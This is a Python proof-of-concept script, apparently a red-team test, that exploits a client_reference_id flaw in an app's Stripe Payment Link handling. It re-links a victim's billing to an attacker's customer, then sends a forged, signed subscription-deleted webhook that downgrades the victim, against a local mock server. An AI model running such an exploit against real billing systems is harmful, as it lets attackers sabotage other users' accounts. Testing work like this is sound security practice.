#!/usr/bin/env python3
"""RT-05: a Payment Link purchase whose client_reference_id names ANOTHER user re-links that user's billing to the
payer's Stripe customer; the payer then cancels and the victim drops to Free (their real subscription keeps billing).
Runs against the E2E_MOCK dev server only: the in-app Stripe mock plays Stripe (checkout + the webhooks it sends);
step 3 signs the customer.subscription.deleted event Stripe would send, with the e2e webhook secret.
Usage: python3 -I clientref_hijack.py http://localhost:3410 <victim_user_id> <victim_cookie_jar_cookie_header>"""
import hashlib, hmac, json, sys, time, urllib.parse, urllib.request

base, victim, cookie = sys.argv[1], sys.argv[2], sys.argv[3]
SECRET = "whsec_e2e"


def me():
    r = urllib.request.Request(f"{base}/api/me", headers={"cookie": cookie})
    d = json.load(urllib.request.urlopen(r))
    return {k: d[k] for k in ("tier", "status")}


print("victim before:", me())
# 1. Attacker opens the Payment Link with ?client_reference_id=<victim> (no Kismet account, no metadata).
form = urllib.parse.urlencode({"client_reference_id": victim, "line_items[0][price]": "price_pro_m",
                               "success_url": f"{base}/"}).encode()
s = json.load(urllib.request.urlopen(urllib.request.Request(f"{base}/e2e-mock/stripe/v1/checkout/sessions", data=form)))
# 2. Attacker pays: Stripe sends checkout.session.completed (client_reference_id=victim) + subscription.created.
urllib.request.urlopen(s["url"])
print("victim after attacker's checkout:", me())
# 3. Attacker cancels their own subscription; Stripe sends customer.subscription.deleted for the attacker's customer.
ev = {"id": f"evt_rt05_{int(time.time())}", "object": "event", "type": "customer.subscription.deleted", "created": int(time.time()),
      "data": {"object": {"id": "sub_attacker", "object": "subscription", "customer": s["customer"], "status": "canceled",
                          "metadata": {}, "cancel_at_period_end": False,
                          "items": {"object": "list", "data": [{"id": "si", "object": "subscription_item", "current_period_end": int(time.time()),
                                                                "price": {"id": "price_pro_m", "object": "price"}}]}}}}
payload = json.dumps(ev)
t = int(time.time())
sig = hmac.new(SECRET.encode(), f"{t}.{payload}".encode(), hashlib.sha256).hexdigest()
r = urllib.request.urlopen(urllib.request.Request(f"{base}/api/stripe/webhook", data=payload.encode(),
                                                  headers={"stripe-signature": f"t={t},v1={sig}", "content-type": "application/json"}))
print("webhook:", r.status, r.read().decode())
print("victim after attacker cancels:", me())
